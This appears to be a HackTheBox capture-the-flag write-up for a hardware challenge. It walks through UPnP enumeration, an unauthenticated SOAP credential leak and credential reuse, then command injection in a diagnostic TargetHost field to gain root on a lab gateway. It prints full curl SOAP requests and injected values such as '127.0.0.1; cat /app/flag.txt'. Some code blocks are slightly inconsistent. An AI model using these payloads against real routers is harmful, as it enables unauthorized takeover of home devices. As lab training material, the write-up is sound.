---
title: HackTheBox Challenges
date: 2026-06-08
categories: [HackTheBox, Write-up]
tags: [write-up, tutorial, hackthebox]
author: Mohamad Helmi
description: "HackTheBox challenges write-up"
---
# Intro
I tried some unique challenges on HacktheBox to learn new things from it. The categories are ICS, Hardware, Reversing, and some new web exploitation techniques that I learned from it.

## Plug & Pray (Hardware)
VortexLink Networking ships the GX3000 cable gateway to thousands of homes. A penetration tester has discovered that a test unit exposes an HTTP service. VortexLink insists nothing sensitive is exposed. Prove them wrong.

### Enumeration
Paste the given IP address in the browser, and we'll see the gateway admin UI for a VortexLink GX3000 router — firmware 4.2.1-RELEASE, with UPnP/IGD active.

![Gateway UI](/assets/img/posts/2026-06-08-HackTheBox-challenges/web_page.png)

The UI gives us device context, but the real attack surface is the UPnP device description XML. Navigating to `/rootDesc.xml` reveals two registered services:

- **WANIPConnection:1** — controlURL: `/ctl/IPConn`, SCPD: `/WANIPCn.xml`
- **DiagnosticService:1** — controlURL: `/ctl/Diag`, SCPD: `/diag.xml`

![rootDesc.xml response](/assets/img/posts/2026-06-08-HackTheBox-challenges/rootDesc.png)

### Service Action Enumeration
Fetching both SCPD files lists every available SOAP action for each service.

From `/WANIPCn.xml`, WANIPConnection exposes:
- `GetExternalIPAddress`
- `GetUserName`
- `GetPassword` ← interesting

From `/diag.xml`, DiagnosticService exposes:
- `GetDeviceInfo`
- `RunNetworkTest` ← interesting, accepts a `TargetHost` parameter

### Credential Leak
`GetPassword` requires no authentication. A simple SOAP POST to `/ctl/IPConn` hands us the ISP provisioning password in plaintext.

**Request:**
```bash
curl -s -X POST http://IP:PORT/ctl/IPConn \
  -H 'Content-Type: text/xml' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetPassword"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:GetPassword xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
    </u:GetPassword>
  </s:Body>
```

**Response:**

```xml
</s:Envelope>'
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetPasswordResponse xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1">
            <NewPassword>Pass</NewPassword>
    </u:GetPasswordResponse>
  </s:Body>
</s:Envelope>
```

The response contains `<NewPassword>Pass</NewPassword>`. No authentication, no rate limiting — just a free credential leak.

### Trust Boundary Pivot
Reading `diag.xml` more carefully reveals that DiagnosticService requires an `X-Diag-Key` header for authentication. The intended key is the ISP provisioning password we just leaked.

This is a classic cross-service trust boundary issue: Service A leaks a secret that Service B blindly trusts.

We confirm access by calling `GetDeviceInfo` with the key:
- X-Diag-Key: Pass
- SOAPAction: "urn:schemas-upnp-org:service:DiagnosticService:1#GetDeviceInfo"

```xml
<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
  <s:Body>
    <u:GetDeviceInfoResponse xmlns:u="urn:schemas-upnp-org:service:DiagnosticService:1">
            <ModelName>GX3000</ModelName>
            <FirmwareVersion>4.2.1-RELEASE</FirmwareVersion>
            <Uptime>5681</Uptime>
    </u:GetDeviceInfoResponse>
  </s:Body>
</s:Envelope>  
```

HTTP 200 with device info — we're in.

### Command Injection
`RunNetworkTest` passes the `TargetHost` parameter directly to a shell command (a ping/traceroute/dns wrapper) without sanitization. This is our injection sink.

Before reading the flag, we validate RCE with a harmless payload first:

**Request:**
```bash
curl -s -X POST http://TARGET/ctl/Diag \
  -H 'Content-Type: text/xml' \
  -H 'X-Diag-Key: Gx3000@ISP#2024' \
  -H 'SOAPAction: "urn:schemas-upnp-org:service:DiagnosticService:1#RunNetworkTest"' \
  -d '<?xml version="1.0"?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
  <s:Body>
    <u:RunNetworkTest xmlns:u="urn:schemas-upnp-org:service:DiagnosticService:1">
      <TargetHost>127.0.0.1; id</TargetHost>
      <TestType>ping</TestType>
    </u:RunNetworkTest>
  </s:Body>
</s:Envelope>'
```

![RCE id command output](/assets/img/posts/2026-06-08-HackTheBox-challenges/id_cmd.png)

The `id` output appears inside `<TestResult>` — RCE confirmed, running as root.

### Flag
With RCE confirmed, we read the flag directly:

```xml
<TargetHost>127.0.0.1; cat /app/flag.txt</TargetHost>
```

The flag is returned inside the `<TestResult>` tag in the SOAP response.

### Key Takeaways
This challenge demonstrates a UPnP/SOAP control-plane attack chain that is entirely protocol-driven:

1. `rootDesc.xml` exposes all service URLs and action definitions
2. An unauthenticated SOAP action leaks a credential
3. That credential is reused as an auth header in a second service
4. A user-controlled parameter in that service is passed unsanitized to a shell command

The lesson: always enumerate UPnP description XML before assuming a device exposes nothing sensitive. The admin UI is just context — the attack surface lives in the XML.